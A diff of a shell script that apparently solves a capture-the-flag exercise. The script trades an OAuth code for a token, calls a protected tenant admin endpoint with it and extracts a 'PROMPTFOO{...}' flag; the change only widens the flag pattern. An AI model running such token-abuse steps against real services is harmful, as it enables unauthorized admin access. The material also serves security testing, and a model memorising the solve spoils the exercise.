@@ -11,6 +11,6 @@ tok="$(curl -s "$BASE/oauth/token?code=$code" | python3 -c 'import sys,json;prin
 echo "    token=$tok"
 
 echo "[*] stage 2 — perform the protected tenant action ->"
-flag="$(curl -s "$BASE/api/tenant/admin?token=$tok" | grep -o 'PROMPTFOO{s4_oauth[^}]*}' | head -n1)"
+flag="$(curl -s "$BASE/api/tenant/admin?token=$tok" | grep -o 'PROMPTFOO{[^}]*}' | head -n1)"
 [ -n "$flag" ] || { echo "[!] flag not recovered" >&2; exit 1; }
 echo "$flag"
